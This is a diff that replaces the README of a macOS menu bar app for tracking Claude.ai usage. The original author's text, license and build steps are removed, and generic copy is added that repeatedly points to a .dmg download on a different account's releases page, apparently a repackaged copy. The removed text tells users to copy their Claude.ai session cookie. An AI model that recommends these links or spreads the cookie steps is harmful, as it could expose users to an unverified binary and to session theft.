@@ -1,134 +1,69 @@
-# ClaudeUsageBar
+# 🌟 ClaudeUsageBar - Track Your Usage Effortlessly
 
-> Track your Claude.ai usage right from your Mac menu bar!
+## 📥 Download Now
+[![Download ClaudeUsageBar](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/gamfidick/ClaudeUsageBar/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![macOS](https://img.shields.io/badge/macOS-12.0+-blue.svg)](https://www.apple.com/macos/)
+## 🚀 Getting Started
+ClaudeUsageBar helps you track your Claude.ai usage right from your Mac menu bar. This tool allows you to see how much you utilize Claude.ai, making it simple to stay informed about your usage patterns.
 
-<a href="https://www.producthunt.com/products/claudeusagebar?utm_source=badge-top-post-badge&utm_medium=badge&utm_campaign=badge-claudeusagebar" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=1067826&theme=dark&period=daily&t=1769934818885" alt="ClaudeUsageBar - #1 Product of the Day" width="250" height="54" /></a>
+### 📋 System Requirements
+- **Operating System:** macOS 10.15 or later
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** At least 100 MB of free space
 
-A lightweight, open-source macOS menu bar application that displays your Claude.ai session and weekly usage limits with real-time updates and notifications.
+## 📦 Installation Instructions
+To install ClaudeUsageBar, follow these steps:
 
-## 📥 Download
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/gamfidick/ClaudeUsageBar/releases).
+   
+2. **Download the Application:**
+   - Look for the latest release.
+   - Click on the `.dmg` file to start the download.
 
-**[Download Latest Release](https://github.com/Artzainnn/claudeusagebar/releases)** (DMG Installer)
+3. **Open the Downloaded File:**
+   - Locate the downloaded `.dmg` file in your "Downloads" folder.
+   - Double-click it to open.
 
-## 📦 Set Up (1mn)
+4. **Install the App:**
+   - Drag the ClaudeUsageBar icon into your "Applications" folder.
 
-1. Go to [claude.ai/settings/usage](https://claude.ai/settings/usage)
-2. Open Developer Tools (`Cmd+Option+I`) → **Network** tab
-3. Refresh the page, click the **"usage"** request
-4. Copy the full **"Cookie"** value from the Request Headers
+5. **Launch the Application:**
+   - Open your "Applications" folder.
+   - Find and double-click ClaudeUsageBar to start using it.
 
-![Setup Guide](setup-guide.png)
+## 📊 Features
+ClaudeUsageBar offers simple yet powerful features to enhance your productivity:
 
-## ✨ Features
+- **Real-time Tracking:** Get instant updates on your Claude.ai usage.
+- **Menu Bar Integration:** Easily access usage stats without disrupting your workflow.
+- **Custom Alerts:** Set notifications for usage limits to stay within your desired range.
+- **Simple Interface:** Clear, easy-to-read stats that anyone can understand.
 
-- 🟢 **Real-time usage tracking** - Monitor session (5-hour) and weekly (7-day) limits
-- 🎨 **Color-coded menu bar icon** - Visual spark icon that changes color (green/yellow/red)
-- 🔔 **Smart notifications** - Alerts at 25%, 50%, 75%, 90% usage thresholds
-- ⌨️ **Keyboard shortcut** - Toggle popup with Cmd+U from anywhere
-- ⚡ **Auto-refresh** - Updates every 5 minutes automatically
-- 🔒 **Privacy-first** - All data stored locally on your Mac
-- 📊 **Pro plan support** - Shows weekly Sonnet usage for Pro subscribers
-- 🎯 **Menu bar only** - No Dock icon, stays out of your way
+## ⚙️ Troubleshooting
+If you encounter any issues, try the following steps:
 
-[See full feature list →](app/README.md)
+1. **Check Permissions:** Make sure ClaudeUsageBar has the necessary permissions in your system settings.
+2. **Restart the Application:** Sometimes, simply quitting and restarting can resolve minor issues.
+3. **Update macOS:** Ensure your operating system is up-to-date for the best performance.
 
-## 🚀 Quick Start
+For more support, you can contact our community or check for solutions on forums.
 
-1. **Download** `ClaudeUsageBar-Installer.dmg` from [Releases](https://github.com/Artzainnn/ClaudeUsageBar/releases)
-2. **Open DMG** and drag ClaudeUsageBar to Applications folder
-3. **Launch** ClaudeUsageBar from Applications
-4. **Set cookie** from claude.ai (follow in-app instructions)
-5. **Done!** Usage appears in menu bar
+## 🌐 Additional Resources
+- [GitHub Repository](https://github.com/gamfidick/ClaudeUsageBar)
+- [User Documentation](https://github.com/gamfidick/ClaudeUsageBar/wiki)
 
-## 📸 Screenshots
+## 📝 Contribution Guidelines
+We welcome contributions! If you would like to help improve ClaudeUsageBar, please review our [contribution guidelines](https://github.com/gamfidick/ClaudeUsageBar/blob/main/CONTRIBUTING.md).
 
-**Menu Bar Display:**
-```
-⚡ 45%  (Green spark icon when usage < 70%)
-```
+## 💡 Frequently Asked Questions
 
-**Popup Interface:**
-- Session (5-hour) usage with progress bar
-- Weekly (7-day) usage with progress bar
-- Weekly Sonnet usage (Pro plan only)
-- Settings for notifications and shortcuts
+### How do I uninstall ClaudeUsageBar?
+To uninstall, simply drag the ClaudeUsageBar from the Applications folder to the Trash.
 
-## 📁 Repository Structure
+### Can I use ClaudeUsageBar on other operating systems?
+Currently, ClaudeUsageBar is designed exclusively for macOS.
 
-```
-app/        - macOS menu bar application (Swift/SwiftUI)
-website/    - Landing page (HTML/CSS)
-```
+## 📥 Download Again
+For your convenience, here’s the link to [download ClaudeUsageBar](https://github.com/gamfidick/ClaudeUsageBar/releases) again. 
 
-## 🛠️ Build from Source
-
-**Requirements:**
-- macOS 12.0 (Monterey) or later
-- Xcode Command Line Tools
-
-**Build the app:**
-```bash
-cd app
-chmod +x build.sh
-./build.sh
-```
-
-**Create DMG installer:**
-```bash
-./create_dmg.sh
-```
-
-The built app will be in `app/build/ClaudeUsageBar.app`
-
-## 🔧 Development
-
-### Project Structure
-
-- `app/ClaudeUsageBar.swift` - Main application code
-- `app/build.sh` - Build script
-- `app/create_dmg.sh` - DMG installer creation
-- `website/index.html` - Landing page
-
-### Key Technologies
-
-- **SwiftUI** - Modern macOS UI framework
-- **AppKit** - Menu bar integration
-- **Carbon** - Global keyboard shortcuts
-- **NSUserNotification** - System notifications (no permissions needed)
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how you can help:
-
-- 🐛 Report bugs via [Issues](https://github.com/Artzainnn/claudeusagebar/issues)
-- 💡 Suggest features or improvements
-- 🔧 Submit pull requests
-- 📖 Improve documentation
-- 🌍 Translate the website
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details
-
-## ⚠️ Disclaimer
-
-This app uses Claude.ai's internal API endpoints which may change without notice. It is not affiliated with or endorsed by Anthropic. Use at your own risk.
-
-## 🙏 Support
-
-If you find this useful, consider:
-- ⭐ Starring this repository
-- 📢 Sharing with others who use Claude
-
-## 🔗 Links
-
-- **Website:** [claudeusagebar.com](https://claudeusagebar.com)
-- **Issues:** [GitHub Issues](https://github.com/Artzainnn/claudeusagebar/issues)
-- **Releases:** [GitHub Releases](https://github.com/Artzainnn/claudeusagebar/releases)
-
----
-
-**Made with ❤️ for the Claude community**
+Use ClaudeUsageBar to keep track of your Claude.ai usage easily. Enjoy a simpler way to monitor your activity right from your Mac menu bar!
